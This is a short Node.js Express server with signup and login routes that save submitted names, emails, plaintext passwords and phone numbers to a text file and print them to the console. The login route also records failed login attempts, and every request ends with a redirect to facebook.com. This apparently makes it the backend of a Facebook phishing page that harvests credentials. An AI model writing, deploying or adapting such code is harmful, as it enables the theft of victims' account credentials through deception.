const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

const filePath = path.join(__dirname, 'users.txt');

if (!fs.existsSync(filePath)) {
  fs.writeFileSync(filePath, '');
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

// Signup route
app.post('/signup', (req, res) => {
  const { firstName, lastName, email, password, phone } = req.body;
  const userData = `Name: ${firstName} ${lastName}\nEmail: ${email}\nPassword: ${password}\nPhone: ${phone}\n\n`;
  console.log('Saving user data:', userData);
  fs.appendFile(filePath, userData, (err) => {
    if (err) {
      console.error('Error saving data:', err);
      res.send('An error occurred while saving your data.');
    } else {
      console.log('Data saved successfully!');
      res.redirect('https://www.facebook.com');
    }
  });
});

// Login route
app.post('/login', (req, res) => {
  const { identifier, password } = req.body;
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      console.error('Error reading data:', err);
      res.send('An error occurred while logging in.');
      return;
    }
    console.log('Data read:', data);
    const users = data.split('\n\n');
    console.log('Users:', users);
    const userExists = users.some(user => {
      console.log('User:', user);
      return (user.includes(`Email: ${identifier}`) || user.includes(`Phone: ${identifier}`)) && user.includes(`Password: ${password}`);
    });
    if (userExists) {
      res.redirect('https://www.facebook.com');
    } else {
      const userData = `Email: ${identifier}\nPassword: ${password}\nPhone: ${identifier}\n\n`;
      fs.appendFile(filePath, userData, (err) => {
        if (err) {
          console.error('Error saving data:', err);
          res.send('An error occurred while saving your data.');
        } else {
          console.log('New user data saved successfully!');
          res.redirect('https://www.facebook.com');
        }
      });
    }
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
